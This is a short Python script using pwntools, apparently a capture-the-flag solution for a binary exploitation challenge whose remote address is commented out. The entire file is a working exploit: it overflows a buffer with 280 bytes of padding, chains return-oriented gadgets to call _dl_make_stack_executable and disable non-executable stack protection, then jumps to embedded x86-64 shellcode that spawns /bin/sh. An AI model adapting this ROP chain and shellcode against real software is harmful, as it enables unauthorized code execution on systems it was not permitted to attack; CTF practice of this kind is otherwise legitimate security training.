from pwn import *

#r = remote('pwn.botani.cf',3240)


shell = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

buff = ""
buff += "A"*280
buff += p64(0x044d4f4) #pop rax,ret
buff += p64(0x0468680) #stack protection
buff += p64(0x0437445) #pop rdx, ret
buff += p64(0x7)
buff += p64(0x0444c2f) 
buff += p64(0x0401713) #pop rdi, ret
buff += p64(0x0468677) #libstackend
buff += p64(0x0468660) #_dl_make_stack_executable 0000000000468660
buff += p64(0x0496c67) #jmprsp
buff += shell

print buff
#print r.recv()
#r.sendline(buff)
#print r.recv()
#r.interactive()
